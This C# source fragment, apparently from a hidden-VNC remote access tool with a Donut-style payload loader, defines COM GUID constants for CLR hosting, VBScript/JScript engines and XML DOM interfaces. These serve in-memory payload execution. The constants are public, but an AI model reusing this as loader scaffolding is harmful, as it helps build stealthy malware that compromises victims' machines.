using System;
using ShitarusPrivate.HVNC.StubUtils.Donut.Payloads;
...
namespace ShitarusPrivate
{
    public class Constants
    {
        ...
        public static Guid xCLSID_CorRuntimeHost = new Guid(3408881443u, 43834, 4562, 156, 64, 0, 192, 79, 163, 10, 62);

        public static Guid xIID_ICorRuntimeHost = new Guid(3408881442u, 43834, 4562, 156, 64, 0, 192, 79, 163, 10, 62);

        public static Guid xCLSID_CLRMetaHost = new Guid(2457868429u, 3726, 18535, 179, 12, 127, 168, 56, 132, 232, 222);

        public static Guid xIID_ICLRMetaHost = new Guid(3543325598u, 47539, 16677, 130, 7, 161, 72, 132, 245, 50, 22);

        public static Guid xIID_ICLRRuntimeInfo = new Guid(3174683090u, 47663, 18538, 137, 176, 180, 176, 203, 70, 104, 145);

        public static Guid xIID_AppDomain = new Guid(100046556, 11049, 13923, 173, 139, 196, 56, 156, 242, 167, 19);

        public static Guid xIID_IUnknown = new Guid(0, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70);

        public static Guid xIID_IDispatch = new Guid(132096, 0, 0, 192, 0, 0, 0, 0, 0, 0, 70);

        public static Guid xIID_IHost = new Guid(2444213531u, 24555, 17397, 176, 40, 226, 202, 150, 6, 23, 236);

        public static Guid xIID_IActiveScript = new Guid(3139054305u, 42233, 4559, 143, 32, 0, 128, 95, 44, 208, 100);

        public static Guid xIID_IActiveScriptSite = new Guid(3674317283u, 42027, 4559, 143, 32, 0, 128, 95, 44, 208, 100);

        public static Guid xIID_IActiveScriptSiteWindow = new Guid(3507447649u, 33769, 4559, 143, 32, 0, 128, 95, 44, 208, 100);

        public static Guid xIID_IActiveScriptParse32 = new Guid(3139054306u, 42233, 4559, 143, 32, 0, 128, 95, 44, 208, 100);

        public static Guid xIID_IActiveScriptParse64 = new Guid(3354359384u, 57838, 18446, 151, 234, 213, 44, 180, 215, 109, 23);

        public static Guid xCLSID_VBScript = new Guid(3041867585u, 23303, 4559, 164, 176, 0, 170, 0, 74, 85, 232);

        public static Guid xCLSID_JScript = new Guid(4095001184u, 27328, 4559, 182, 209, 0, 170, 0, 187, 187, 88);

        public static Guid xCLSID_DOMDocument30 = new Guid(4110913330u, 50513, 4563, 137, 185, 0, 0, 248, 31, 226, 33);

        public static Guid xIID_IXMLDOMDocument = new Guid(691257217, 31542, 4562, 178, 14, 0, 192, 79, 152, 62, 96);

        public static Guid xIID_IXMLDOMNode = new Guid(691257216, 31542, 4562, 178, 14, 0, 192, 79, 152, 62, 96);
